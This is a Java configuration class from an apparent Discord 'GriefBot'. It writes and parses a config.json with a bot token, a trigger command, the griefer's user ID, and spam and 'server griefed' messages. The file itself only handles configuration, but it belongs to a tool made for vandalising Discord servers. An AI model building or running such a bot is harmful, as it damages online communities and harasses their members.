package de.corruptedbytes.utils;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import de.corruptedbytes.GriefBot;

public class Config {

	public final static File GRIEF_PICTURE = new File("griefed.png");
	private final static File CONFIG_FILE = new File("config.json");

	public static void initConfig() throws IOException {
		if (!CONFIG_FILE.exists()) {
			createTemplateConfig();
			System.out.println("Please edit the File: " + CONFIG_FILE);
			System.exit(-1);
		}

		String s = null;
		StringBuilder configFileString = new StringBuilder();
		InputStream in = new FileInputStream(CONFIG_FILE);
		BufferedReader reader = new BufferedReader(new InputStreamReader(in));

		while ((s = reader.readLine()) != null) {
			configFileString.append(s).append("\n");
		}
		
		reader.close();

		if (!GRIEF_PICTURE.exists()) {
			System.out.println("Please add an Image with File Name: " + GRIEF_PICTURE);
			System.exit(-1);
		}

		GriefBot.getInstance().setDiscordBotToken(getJsonKey(configFileString.toString(), "botToken"));
		GriefBot.getInstance().setGriefCommand(getJsonKey(configFileString.toString(), "griefCommand"));
		GriefBot.getInstance().setGrieferUserID(getJsonKey(configFileString.toString(), "grieferUserID"));
		GriefBot.getInstance().setActivityDescription(getJsonKey(configFileString.toString(), "activityDescription"));
		GriefBot.getInstance().setGriefMessage(getJsonKey(configFileString.toString(), "griefMessage"));
		GriefBot.getInstance().setSpamMessage(getJsonKey(configFileString.toString(), "spamMessage"));
	}

	private static void createTemplateConfig() throws IOException {
		BufferedWriter writer = new BufferedWriter(new FileWriter(CONFIG_FILE));
		writer.write(
				"{\n \"botToken\": \"YOUR-DISCORD-BOT-TOKEN-HERE\",\n \"griefCommand\": \"%start\",\n \"grieferUserID\": \"YOUR-USERID-HERE\",\n \"activityDescription\": \"Music\",\n \"griefMessage\": \"FUCKED-BY-%s\"\n \"spamMessage\": \"YOUR DISCORD SERVER WAS GRIEFED!\"\n}");
		writer.close();
	}

	private static String getJsonKey(String jsonString, String wantedKey) {
		Pattern jsonPattern = Pattern.compile("\"" + wantedKey + "\": \".*\"");
		Matcher matcher = jsonPattern.matcher(jsonString);

		if (matcher.find()) {
			return matcher.group(0).split("\"")[3];
		}
		return null;
	}

}
